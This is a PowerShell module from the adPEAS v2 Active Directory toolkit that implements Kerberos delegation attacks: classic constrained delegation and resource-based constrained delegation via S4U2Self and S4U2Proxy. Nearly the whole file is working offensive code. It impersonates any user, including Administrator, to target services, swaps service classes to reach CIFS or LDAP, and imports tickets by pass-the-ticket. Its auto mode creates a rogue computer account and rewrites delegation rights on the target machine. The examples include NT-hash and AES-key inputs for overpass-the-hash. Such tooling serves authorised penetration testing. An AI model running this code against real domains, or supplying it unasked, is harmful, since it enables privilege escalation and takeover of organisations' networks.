# Invoke-S4U.ps1
# S4U (Service for User) Attack Implementation
# Supports Classic Constrained Delegation and Resource-Based Constrained Delegation (RBCD)
#
# Architecture:
# - Invoke-S4UCore: Internal function containing S4U workflow logic
# - Invoke-ConstrainedDelegation: Public function for Classic CD (Scenario 1)
# - Invoke-RBCD: Public function for RBCD attacks (Scenarios 2+3)

# ============================================================================
# LAYER 1: Internal Core Function
# ============================================================================

function Invoke-S4UCore {
    <#
    .SYNOPSIS
        Internal core function for S4U attacks. Not intended for direct use.

    .DESCRIPTION
        Performs the complete S4U2Self + S4U2Proxy workflow with optional
        AlternateService substitution and Pass-the-Ticket.

        This is an internal function called by Invoke-ConstrainedDelegation
        and Invoke-RBCD. Do not call directly.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServiceAccount,

        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Service Account Authentication (one of these)
        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$false)]
        [string]$ServicePassword,

        [Parameter(Mandatory=$false)]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$false)]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$false)]
        [string]$ServiceAES128Key,

        # Flags
        [Parameter(Mandatory=$false)]
        [switch]$UseRBCD,

        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        Write-Log "[Invoke-S4UCore] Starting S4U workflow"
        Write-Log "[Invoke-S4UCore] Service Account: $ServiceAccount"
        Write-Log "[Invoke-S4UCore] Impersonate User: $ImpersonateUser"
        Write-Log "[Invoke-S4UCore] Target SPN: $TargetSPN"
        Write-Log "[Invoke-S4UCore] RBCD Mode: $UseRBCD"
    }

    process {
        try {
            # Resolve Server if not specified
            if (-not $Server) {
                if ($Script:LDAPContext -and $Script:LDAPContext.ContainsKey('Server') -and $Script:LDAPContext['Server']) {
                    $Server = $Script:LDAPContext['Server']
                    Write-Log "[Invoke-S4UCore] Using DC from session: $Server"
                } else {
                    $Server = Resolve-adPEASName -Type DC -Domain $Domain
                    if (-not $Server) {
                        throw "Could not resolve Domain Controller for domain '$Domain'. Specify -Server explicitly."
                    }
                    Write-Log "[Invoke-S4UCore] Resolved DC via DNS: $Server"
                }
            }

            # Step 1: Get TGT for Service Account
            Write-Log "[Invoke-S4UCore] Step 1: Requesting TGT for '$ServiceAccount'"

            $authParams = @{
                UserName         = $ServiceAccount
                Domain           = $Domain
                DomainController = $Server
            }

            if ($ServiceCredential) { $authParams['Credential'] = $ServiceCredential }
            elseif ($ServicePassword) { $authParams['Password'] = $ServicePassword }
            elseif ($ServiceNTHash) { $authParams['NTHash'] = $ServiceNTHash }
            elseif ($ServiceAES256Key) { $authParams['AES256Key'] = $ServiceAES256Key }
            elseif ($ServiceAES128Key) { $authParams['AES128Key'] = $ServiceAES128Key }
            else {
                throw "Service account authentication required. Provide -ServiceCredential, -ServicePassword, -ServiceNTHash, -ServiceAES256Key, or -ServiceAES128Key"
            }

            $tgtResult = Invoke-KerberosAuth @authParams

            if (-not $tgtResult -or -not $tgtResult.Success) {
                $errMsg = if ($tgtResult) { $tgtResult.Error } else { "No result returned" }
                throw "Failed to obtain TGT for '$ServiceAccount': $errMsg"
            }

            $tgtServer = $tgtResult.DomainController
            Write-Log "[Invoke-S4UCore] TGT acquired via $tgtServer (etype $($tgtResult.EncryptionType))"

            # Step 2: S4U2Self - Protocol Transition
            Write-Log "[Invoke-S4UCore] Step 2: S4U2Self - requesting ticket on behalf of '$ImpersonateUser'"

            $s4u2selfResult = Request-ServiceTicket `
                -TGT $tgtResult.TicketBytes `
                -SessionKey $tgtResult.SessionKeyBytes `
                -SessionKeyType $tgtResult.EncryptionType `
                -ServicePrincipalName $ServiceAccount `
                -Domain $Domain `
                -DomainController $tgtServer `
                -UserName $ServiceAccount `
                -S4U2Self `
                -ImpersonateUser $ImpersonateUser

            if (-not $s4u2selfResult -or -not $s4u2selfResult.Success) {
                $errMsg = if ($s4u2selfResult) { $s4u2selfResult.Message } else { "No result returned" }
                throw "S4U2Self failed: $errMsg"
            }

            Write-Log "[Invoke-S4UCore] S4U2Self succeeded (etype: $($s4u2selfResult.EncryptionType))"

            # Step 3: S4U2Proxy - Constrained Delegation
            Write-Log "[Invoke-S4UCore] Step 3: S4U2Proxy - forwarding ticket to '$TargetSPN'"

            $s4u2proxyParams = @{
                TGT                  = $tgtResult.TicketBytes
                SessionKey           = $tgtResult.SessionKeyBytes
                SessionKeyType       = $tgtResult.EncryptionType
                ServicePrincipalName = $TargetSPN
                Domain               = $Domain
                DomainController     = $tgtServer
                UserName             = $ServiceAccount
                S4U2Proxy            = $true
                AdditionalTicket     = $s4u2selfResult.TicketBytes
                ImpersonateUser      = $ImpersonateUser
            }

            if ($UseRBCD) {
                $s4u2proxyParams['ResourceBased'] = $true
                Write-Log "[Invoke-S4UCore] Using RBCD mode (PA-PAC-OPTIONS flag)"
            }

            $s4u2proxyResult = Request-ServiceTicket @s4u2proxyParams

            if (-not $s4u2proxyResult -or -not $s4u2proxyResult.Success) {
                $errMsg = if ($s4u2proxyResult) { $s4u2proxyResult.Message } else { "No result returned" }
                throw "S4U2Proxy failed: $errMsg"
            }

            Write-Log "[Invoke-S4UCore] S4U2Proxy succeeded (etype: $($s4u2proxyResult.EncryptionType))"

            # Extract target host from SPN for AlternateService
            $spnParts = $TargetSPN -split '/', 2
            $originalService = if ($spnParts.Count -ge 2) { $spnParts[0] } else { "" }
            $targetHost = if ($spnParts.Count -ge 2) { $spnParts[1] } else { $TargetSPN }

            # Build base KRB-CRED for original ticket (needed for PTT and AlternateService)
            $baseKrbCredParams = @{
                Ticket         = $s4u2proxyResult.TicketBytes
                SessionKey     = $s4u2proxyResult.SessionKey
                SessionKeyType = $s4u2proxyResult.EncryptionType
                Realm          = $Domain.ToUpper()
                ClientName     = $ImpersonateUser
                ServerName     = $TargetSPN
            }

            $baseKrbCred = Build-KRBCred @baseKrbCredParams

            # Step 4: AlternateService Substitution (optional)
            $alternateTickets = $null
            $altSPNList = $null
            $pttMessage = ""

            if ($AlternateService -and $AlternateService.Count -gt 0) {
                Write-Log "[Invoke-S4UCore] Step 4: Applying SPN substitution for $($AlternateService.Count) alternate service(s)"

                $alternateTickets = @()

                foreach ($altSvc in $AlternateService) {
                    $newSPN = "$altSvc/$targetHost"
                    Write-Log "[Invoke-S4UCore] Substituting: $TargetSPN -> $newSPN"

                    try {
                        # Build KRB-CRED with substituted ServerName
                        $altKrbCredParams = @{
                            Ticket         = $s4u2proxyResult.TicketBytes
                            SessionKey     = $s4u2proxyResult.SessionKey
                            SessionKeyType = $s4u2proxyResult.EncryptionType
                            Realm          = $Domain.ToUpper()
                            ClientName     = $ImpersonateUser
                            ServerName     = $newSPN
                        }

                        $altKrbCred = Build-KRBCred @altKrbCredParams

                        $altTicketObj = [PSCustomObject]@{
                            SPN         = $newSPN
                            TicketBytes = $altKrbCred
                            Imported    = $false
                        }

                        # Optional PTT for alternate ticket
                        if ($PTT) {
                            $pttResult = Import-KerberosTicket -TicketBytes $altKrbCred
                            if ($pttResult -and $pttResult.Success) {
                                $altTicketObj.Imported = $true
                                Write-Log "[Invoke-S4UCore] Alternate ticket imported: $newSPN"
                            } else {
                                Write-Warning "[!] Failed to import alternate ticket for $newSPN"
                            }
                        }

                        $alternateTickets += $altTicketObj
                    }
                    catch {
                        $errMsg = $_.Exception.Message
                        Write-Warning "[!] SPN substitution failed for ${newSPN}: $errMsg"
                    }
                }

                $importedCount = @($alternateTickets | Where-Object { $_.Imported }).Count
                if (-not $PTT) {
                    $pttMessage = " ($($AlternateService.Count) alternate ticket(s) - use -PTT to import)"
                } elseif ($importedCount -eq $AlternateService.Count) {
                    $pttMessage = " ($importedCount alternate ticket(s) imported)"
                } else {
                    $pttMessage = " ($importedCount/$($AlternateService.Count) alternate ticket(s) imported)"
                }

                $altSPNList = ($AlternateService | ForEach-Object { "$_/$targetHost" }) -join ', '
            }
            else {
                # No AlternateService - standard PTT for original ticket
                if ($PTT) {
                    Write-Log "[Invoke-S4UCore] Step 4: Importing ticket via Pass-the-Ticket"

                    $pttResult = Import-KerberosTicket -TicketBytes $baseKrbCred

                    if ($pttResult -and $pttResult.Success) {
                        $pttMessage = " (ticket imported)"
                        Write-Log "[Invoke-S4UCore] Ticket imported successfully"
                    } else {
                        $pttMessage = " (PTT failed - ticket available in result)"
                        Write-Warning "[!] PTT failed, ticket available in result object"
                    }
                } else {
                    $pttMessage = " (ticket not imported - use -PTT to import)"
                }
            }

            # Step 5: Export .kirbi (optional)
            if ($OutputKirbi) {
                Write-Log "[Invoke-S4UCore] Exporting ticket to: $OutputKirbi"

                try {
                    [System.IO.File]::WriteAllBytes($OutputKirbi, $baseKrbCred)
                    Write-Log "[Invoke-S4UCore] Ticket exported successfully"
                }
                catch {
                    Write-Warning "[!] Failed to export .kirbi: $($_.Exception.Message)"
                }
            }

            # Build Result Object
            $delegationType = if ($UseRBCD) { "RBCD" } else { "Classic Constrained Delegation" }

            $result = [PSCustomObject]@{
                PSTypeName          = 'adPEAS.S4U.Result'
                Success             = $true
                DelegationType      = $delegationType
                ServiceAccount      = $ServiceAccount
                ImpersonateUser     = $ImpersonateUser
                TargetSPN           = $TargetSPN
                Domain              = $Domain
                DomainController    = $tgtServer
                TicketBytes         = $baseKrbCred
                Imported            = ($PTT -and -not $AlternateService)
                Message             = "S4U attack successful$pttMessage"
            }

            # Add AlternateService results if present
            if ($alternateTickets) {
                $result | Add-Member -NotePropertyName 'AlternateService' -NotePropertyValue $AlternateService
                $result | Add-Member -NotePropertyName 'AlternateTickets' -NotePropertyValue $alternateTickets
                $result | Add-Member -NotePropertyName 'AlternateSPNs' -NotePropertyValue $altSPNList
            }

            # Add OutputKirbi path if used
            if ($OutputKirbi) {
                $result | Add-Member -NotePropertyName 'KirbiFile' -NotePropertyValue $OutputKirbi
            }

            return $result
        }
        catch {
            Write-Log "[Invoke-S4UCore] S4U attack failed: $($_.Exception.Message)"

            return [PSCustomObject]@{
                PSTypeName      = 'adPEAS.S4U.Result'
                Success         = $false
                ServiceAccount  = $ServiceAccount
                ImpersonateUser = $ImpersonateUser
                TargetSPN       = $TargetSPN
                Domain          = $Domain
                Message         = "S4U attack failed"
                Error           = $_.Exception.Message
            }
        }
    }
}


# ============================================================================
# LAYER 2: Public Functions
# ============================================================================

function Invoke-ConstrainedDelegation {
    <#
    .SYNOPSIS
        Performs Classic Constrained Delegation attack using S4U2Self + S4U2Proxy.

    .DESCRIPTION
        Exploits Classic Constrained Delegation to impersonate any user (including
        protected users without delegation restrictions) to a target service.

        This attack leverages S4U extensions in the Kerberos protocol:
        - S4U2Self (Protocol Transition): Request a service ticket on behalf of another user
        - S4U2Proxy (Constrained Delegation): Forward the ticket to a target service

        Prerequisites:
        - Service account with msDS-AllowedToDelegateTo attribute configured
        - msDS-AllowedToDelegateTo must contain the target SPN
        - Service account credentials (password, hash, or AES key)

        Attack Scenarios:
        1. Classic CD: Service has msDS-AllowedToDelegateTo to target SPN
        2. AlternateService: Substitute service class (e.g., LDAP -> CIFS)

        Failure Cases:
        - KRB_AP_ERR_NOT_US (47): Protocol Transition not allowed on service account
        - KRB_AP_ERR_BADMATCH (36): Target SPN not in msDS-AllowedToDelegateTo
        - KDC_ERR_BADOPTION (13): Delegation flag not set on S4U2Self ticket

    .PARAMETER ServiceAccount
        Service account with msDS-AllowedToDelegateTo configured (sAMAccountName).

    .PARAMETER ImpersonateUser
        User to impersonate (sAMAccountName). Can be any user, including protected.

    .PARAMETER TargetSPN
        Target SPN from msDS-AllowedToDelegateTo list (e.g., "cifs/server.domain.com").

    .PARAMETER Domain
        Target domain FQDN.

    .PARAMETER Server
        Specific Domain Controller (optional, auto-resolved if not provided).

    .PARAMETER ServiceCredential
        PSCredential object for service account.

    .PARAMETER ServicePassword
        Plain-text password for service account.

    .PARAMETER ServiceNTHash
        NT hash for service account (Overpass-the-Hash).

    .PARAMETER ServiceAES256Key
        AES256 key for service account (Pass-the-Key).

    .PARAMETER ServiceAES128Key
        AES128 key for service account (Pass-the-Key).

    .PARAMETER PTT
        Automatically import ticket via Pass-the-Ticket (no admin required).

    .PARAMETER OutputKirbi
        Export ticket to .kirbi file (for use with Rubeus/Mimikatz).

    .PARAMETER AlternateService
        Array of service classes to substitute (e.g., @('ldap','cifs','host')).
        Enables service class substitution attack.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "websvc" -ImpersonateUser "Administrator" -TargetSPN "cifs/dc01.contoso.com" -Domain "contoso.com" -ServicePassword "P@ssw0rd"

        Impersonate Administrator to CIFS service on DC01 using websvc credentials.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "sqlsvc" -ImpersonateUser "da_user" -TargetSPN "mssql/sql01.contoso.com" -Domain "contoso.com" -ServiceNTHash "8846f7eaee8fb117ad06bdd830b7586c" -PTT

        Overpass-the-Hash attack with automatic ticket import.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "websvc" -ImpersonateUser "Administrator" -TargetSPN "http/web01.contoso.com" -Domain "contoso.com" -ServiceAES256Key "4a3b2c1d..." -AlternateService @('cifs','ldap','host') -PTT

        Substitute HTTP -> CIFS/LDAP/HOST on web01 and import all tickets.

    .OUTPUTS
        PSCustomObject with Success, ServiceAccount, ImpersonateUser, TargetSPN, TicketBytes, etc.

    .NOTES
        Author: Alexander Sturz
        Part of adPEAS v2
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServiceAccount,

        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Service Account Authentication
        [Parameter(Mandatory=$false, ParameterSetName='Credential')]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$false, ParameterSetName='Password')]
        [string]$ServicePassword,

        [Parameter(Mandatory=$false, ParameterSetName='NTHash')]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$false, ParameterSetName='AES256')]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$false, ParameterSetName='AES128')]
        [string]$ServiceAES128Key,

        # Options
        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        Write-Verbose "[Invoke-ConstrainedDelegation] Starting Classic Constrained Delegation attack"
    }

    process {
        # Build core parameters
        $coreParams = @{
            ServiceAccount  = $ServiceAccount
            ImpersonateUser = $ImpersonateUser
            TargetSPN       = $TargetSPN
            Domain          = $Domain
            UseRBCD         = $false
        }

        # Add optional parameters
        if ($Server) { $coreParams['Server'] = $Server }
        if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
        if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
        if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
        if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
        if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
        if ($PTT) { $coreParams['PTT'] = $true }
        if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
        if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

        # Delegate to core function
        return Invoke-S4UCore @coreParams
    }
}

function Invoke-RBCD {
    <#
    .SYNOPSIS
        Performs Resource-Based Constrained Delegation (RBCD) attack.

    .DESCRIPTION
        Exploits Resource-Based Constrained Delegation (RBCD) to impersonate users
        to a target computer. Supports two modes:

        **Manual Mode:**
        - Requires control over a service account with SPN configured
        - Target computer must have msDS-AllowedToActOnBehalfOfOtherIdentity pointing to service account
        - You manually configure RBCD delegation before running attack

        **Auto Mode:**
        - Automatically creates a new computer account via LDAP
        - Configures RBCD delegation on target computer (via Set-DomainComputer)
        - Performs S4U attack with auto-generated credentials
        - Requires:
          - MachineAccountQuota > 0 (default 10)
          - GenericWrite/GenericAll on target computer object

        Attack Flow:
        1. [Auto only] Create computer account via New-DomainComputer
        2. [Auto only] Set msDS-AllowedToActOnBehalfOfOtherIdentity via Set-DomainComputer
        3. S4U2Self: Request ticket on behalf of target user
        4. S4U2Proxy: Forward ticket to target SPN (with PA-PAC-OPTIONS flag)
        5. [Optional] AlternateService substitution
        6. [Optional] Pass-the-Ticket import

        Prerequisites (Manual Mode):
        - Service account with SPN configured
        - Target computer has msDS-AllowedToActOnBehalfOfOtherIdentity configured
        - Service account credentials

        Prerequisites (Auto Mode):
        - Domain credentials with LDAP session active
        - MachineAccountQuota > 0
        - GenericWrite/GenericAll on target computer object

        Failure Cases:
        - Auto Mode: MachineAccountQuota exhausted
        - Auto Mode: No GenericWrite on target computer
        - KRB_AP_ERR_NOT_US (47): Protocol Transition not allowed
        - KDC_ERR_BADOPTION (13): PA-PAC-OPTIONS flag missing or invalid

    .PARAMETER ServiceAccount
        [Manual Mode] Service account with SPN (sAMAccountName).

    .PARAMETER TargetComputer
        [Auto Mode] Target computer to attack (sAMAccountName with or without $).

    .PARAMETER ImpersonateUser
        User to impersonate (sAMAccountName). Can be any user.

    .PARAMETER TargetSPN
        Target SPN (e.g., "cifs/server.domain.com" or "ldap/dc01.domain.com").

    .PARAMETER Domain
        Target domain FQDN.

    .PARAMETER Server
        Specific Domain Controller (optional).

    .PARAMETER ServiceCredential
        [Manual Mode] PSCredential for service account.

    .PARAMETER ServicePassword
        [Manual Mode] Plain-text password for service account.

    .PARAMETER ServiceNTHash
        [Manual Mode] NT hash for service account.

    .PARAMETER ServiceAES256Key
        [Manual Mode] AES256 key for service account.

    .PARAMETER ServiceAES128Key
        [Manual Mode] AES128 key for service account.

    .PARAMETER PTT
        Automatically import ticket via Pass-the-Ticket.

    .PARAMETER OutputKirbi
        Export ticket to .kirbi file.

    .PARAMETER AlternateService
        Array of service classes for substitution (e.g., @('cifs','ldap','host')).

    .EXAMPLE
        Invoke-RBCD -TargetComputer "DC01" -ImpersonateUser "Administrator" -TargetSPN "ldap/dc01.contoso.com" -Domain "contoso.com" -PTT

        Auto Mode: Create computer, configure RBCD, impersonate Administrator to LDAP on DC01, import ticket.

    .EXAMPLE
        Invoke-RBCD -ServiceAccount "EVILPC$" -ImpersonateUser "Administrator" -TargetSPN "cifs/fileserver.contoso.com" -Domain "contoso.com" -ServicePassword "P@ssw0rd" -PTT

        Manual Mode: Use existing EVILPC$ computer account.

    .EXAMPLE
        Invoke-RBCD -TargetComputer "WEB01" -ImpersonateUser "da_user" -TargetSPN "http/web01.contoso.com" -Domain "contoso.com" -AlternateService @('cifs','ldap') -PTT

        Auto Mode with service substitution (HTTP -> CIFS/LDAP).

    .OUTPUTS
        PSCustomObject with Success, ServiceAccount, ImpersonateUser, TargetSPN, TicketBytes, ComputerCreated, etc.

    .NOTES
        Author: Alexander Sturz
        Part of adPEAS v2
    #>
    [CmdletBinding(DefaultParameterSetName='Auto')]
    param(
        # Auto Mode Parameters
        [Parameter(Mandatory=$true, ParameterSetName='Auto')]
        [string]$TargetComputer,

        # Manual Mode Parameters
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
        [string]$ServiceAccount,

        # Common Parameters
        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Manual Mode Authentication
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
        [string]$ServicePassword,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
        [string]$ServiceAES128Key,

        # Options
        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        $isAutoMode = $PSCmdlet.ParameterSetName -eq 'Auto'
        $modeText = if ($isAutoMode) { 'Auto' } else { 'Manual' }
        Write-Verbose "[Invoke-RBCD] Starting RBCD attack (Mode: $modeText)"
    }

    process {
        try {
            # Resolve domain if not specified
            if (-not $Domain) {
                if (-not (Ensure-LDAPConnection)) {
                    throw "No LDAP session active and -Domain not specified. Use Connect-adPEAS first or specify -Domain parameter."
                }
                $Domain = $Script:LDAPContext.Domain
                Write-Verbose "[Invoke-RBCD] Using domain from session: $Domain"
            }

            # Auto Mode: Create computer and configure RBCD
            if ($isAutoMode) {
                Write-Verbose "[Invoke-RBCD] Auto Mode: Creating computer and configuring RBCD delegation"

                # Ensure LDAP session exists
                if (-not (Ensure-LDAPConnection)) {
                    throw "Auto Mode requires an active LDAP session. Use Connect-adPEAS first."
                }

                # Build connection parameters for helpers
                $connectionParams = @{}
                if ($Domain) { $connectionParams['Domain'] = $Domain }
                if ($Server) { $connectionParams['Server'] = $Server }

                # Normalize TargetComputer (ensure $ suffix)
                $targetComputerNormalized = if ($TargetComputer.EndsWith('$')) {
                    $TargetComputer
                } else {
                    "$TargetComputer`$"
                }

                # Step 1: Generate computer name and password
                $newComputerName = "RBCD-$(Get-Random -Minimum 1000 -Maximum 9999)"
                $newComputerPassword = New-SafePassword -Length 32
                Write-Verbose "[Invoke-RBCD] Generated computer name: $newComputerName"

                # Step 2: Create computer account
                Write-Verbose "[Invoke-RBCD] Creating computer account: $newComputerName"
                $createResult = New-DomainComputer -ComputerName $newComputerName -Password $newComputerPassword @connectionParams

                if (-not $createResult -or -not $createResult.Success) {
                    $errMsg = if ($createResult) { $createResult.Error } else { "No result returned" }
                    throw "Failed to create computer account: $errMsg"
                }

                $newComputerSamAccountName = $createResult.SamAccountName
                $newComputerDN = $createResult.DistinguishedName
                Write-Verbose "[Invoke-RBCD] Computer account created: $newComputerDN"

                # Step 3: Configure RBCD delegation on target computer
                Write-Verbose "[Invoke-RBCD] Configuring msDS-AllowedToActOnBehalfOfOtherIdentity on $targetComputerNormalized"

                # Get new computer's SID
                $newComputerObj = Get-DomainComputer -Identity $newComputerSamAccountName @connectionParams
                if (-not $newComputerObj -or -not $newComputerObj.objectSid) {
                    throw "Failed to retrieve SID for newly created computer '$newComputerSamAccountName'"
                }

                $newComputerSID = $newComputerObj.objectSid

                # Build security descriptor for RBCD
                $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
                $identity = New-Object System.Security.Principal.SecurityIdentifier($newComputerSID)
                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $identity,
                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                    [System.Security.AccessControl.AccessControlType]::Allow
                )
                $sd.AddAccessRule($ace)

                # Get SDDL bytes
                $sdBytes = $sd.GetSecurityDescriptorBinaryForm()

                # Set msDS-AllowedToActOnBehalfOfOtherIdentity
                $setResult = Set-DomainComputer -Identity $targetComputerNormalized -msDS_AllowedToActOnBehalfOfOtherIdentity $sdBytes @connectionParams

                if (-not $setResult -or -not $setResult.Success) {
                    # Cleanup: Remove created computer
                    Write-Warning "[!] Failed to configure RBCD delegation, cleaning up computer account"
                    try {
                        Remove-DomainObject -Identity $newComputerDN @connectionParams -ErrorAction SilentlyContinue
                    } catch {
                        Write-Warning "[!] Cleanup failed: $($_.Exception.Message)"
                    }

                    $errMsg = if ($setResult) { $setResult.Error } else { "No result returned" }
                    throw "Failed to configure RBCD delegation: $errMsg"
                }

                Write-Verbose "[Invoke-RBCD] RBCD delegation configured successfully"

                # Step 4: Perform S4U attack
                Write-Verbose "[Invoke-RBCD] Performing S4U attack with created computer account"

                $coreParams = @{
                    ServiceAccount  = $newComputerSamAccountName
                    ServicePassword = $newComputerPassword
                    ImpersonateUser = $ImpersonateUser
                    TargetSPN       = $TargetSPN
                    Domain          = $Domain
                    UseRBCD         = $true
                }

                if ($Server) { $coreParams['Server'] = $Server }
                if ($PTT) { $coreParams['PTT'] = $true }
                if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
                if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

                $s4uResult = Invoke-S4UCore @coreParams

                # Add Auto Mode metadata
                if ($s4uResult) {
                    $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Auto' -Force
                    $s4uResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName -Force
                    $s4uResult | Add-Member -NotePropertyName 'ComputerDN' -NotePropertyValue $newComputerDN -Force
                    $s4uResult | Add-Member -NotePropertyName 'TargetComputer' -NotePropertyValue $targetComputerNormalized -Force
                }

                return $s4uResult
            }
            else {
                # Manual Mode: Use existing service account
                Write-Verbose "[Invoke-RBCD] Manual Mode: Using existing service account '$ServiceAccount'"

                $coreParams = @{
                    ServiceAccount  = $ServiceAccount
                    ImpersonateUser = $ImpersonateUser
                    TargetSPN       = $TargetSPN
                    Domain          = $Domain
                    UseRBCD         = $true
                }

                if ($Server) { $coreParams['Server'] = $Server }
                if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
                if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
                if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
                if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
                if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
                if ($PTT) { $coreParams['PTT'] = $true }
                if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
                if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

                $s4uResult = Invoke-S4UCore @coreParams

                # Add Manual Mode metadata
                if ($s4uResult) {
                    $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Manual' -Force
                }

                return $s4uResult
            }
        }
        catch {
            Write-Verbose "[Invoke-RBCD] RBCD attack failed: $($_.Exception.Message)"

            $errorResult = [PSCustomObject]@{
                PSTypeName      = 'adPEAS.S4U.Result'
                Success         = $false
                DelegationType  = "RBCD"
                Mode            = if ($isAutoMode) { "Auto" } else { "Manual" }
                ImpersonateUser = $ImpersonateUser
                TargetSPN       = $TargetSPN
                Domain          = $Domain
                Message         = "RBCD attack failed"
                Error           = $_.Exception.Message
            }

            if ($isAutoMode -and $newComputerName) {
                $errorResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName
            }
            if ($ServiceAccount) {
                $errorResult | Add-Member -NotePropertyName 'ServiceAccount' -NotePropertyValue $ServiceAccount
            }

            return $errorResult
        }
    }
}
